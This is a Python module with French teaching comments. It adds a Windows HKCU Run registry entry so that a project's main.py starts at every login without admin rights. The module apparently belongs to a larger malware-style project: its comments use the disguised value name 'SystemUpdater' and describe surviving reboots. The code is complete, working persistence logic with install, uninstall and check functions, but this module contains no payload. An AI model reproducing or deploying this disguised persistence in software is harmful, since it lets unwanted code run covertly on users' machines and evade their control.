# ============================================================
#  persistence/windows_startup.py — Persistance Windows
#  Rôle : s'enregistrer dans le registre pour survivre au reboot
#  OS cible : Windows uniquement
# ============================================================

# ── CONCEPT : LE REGISTRE WINDOWS ────────────────────────────
# Le registre Windows est une base de données hiérarchique
# qui stocke la configuration du système et des applications.
#
# La clé qui nous intéresse :
#   HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
#
# Tout programme listé ici est lancé automatiquement
# au login de l'utilisateur. Pas besoin d'être admin —
# HKCU (current user) est accessible sans privilèges élevés.
#
# Structure :
#   HKCU
#    └── Software
#         └── Microsoft
#              └── Windows
#                   └── CurrentVersion
#                        └── Run
#                             └── SystemUpdater = "python C:\...\main.py"

import sys
import os

sys.path.append(os.path.join(os.path.dirname(__file__), ".."))
from config import APP_NAME

MAIN_SCRIPT = os.path.join(
    os.path.dirname(os.path.abspath(__file__)),
    "..", "main.py"
)
MAIN_SCRIPT = os.path.normpath(MAIN_SCRIPT)
COMMAND     = f'"{sys.executable}" "{MAIN_SCRIPT}"'
REG_PATH    = r"Software\Microsoft\Windows\CurrentVersion\Run"


def install():
    """Écrit la clé de démarrage dans le registre."""
    try:
        import winreg
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            REG_PATH, 0, winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, APP_NAME, 0, winreg.REG_SZ, COMMAND)
        winreg.CloseKey(key)
        print(f"[Windows] ✅ Clé registre créée : {APP_NAME}")

    except ImportError:
        print("[Windows] winreg non disponible (pas Windows)")
    except Exception as e:
        print(f"[Windows] ❌ {e}")


def uninstall():
    """Supprime la clé de démarrage."""
    try:
        import winreg
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            REG_PATH, 0, winreg.KEY_SET_VALUE
        )
        winreg.DeleteValue(key, APP_NAME)
        winreg.CloseKey(key)
        print(f"[Windows] ✅ Clé supprimée : {APP_NAME}")
    except Exception as e:
        print(f"[Windows] ❌ {e}")


def is_installed():
    """Vérifie si la clé existe déjà."""
    try:
        import winreg
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            REG_PATH, 0, winreg.KEY_READ
        )
        winreg.QueryValueEx(key, APP_NAME)
        winreg.CloseKey(key)
        return True
    except Exception:
        return False


if __name__ == "__main__":
    print(f"Commande : {COMMAND}")
    print(f"Installé : {is_installed()}")
    install()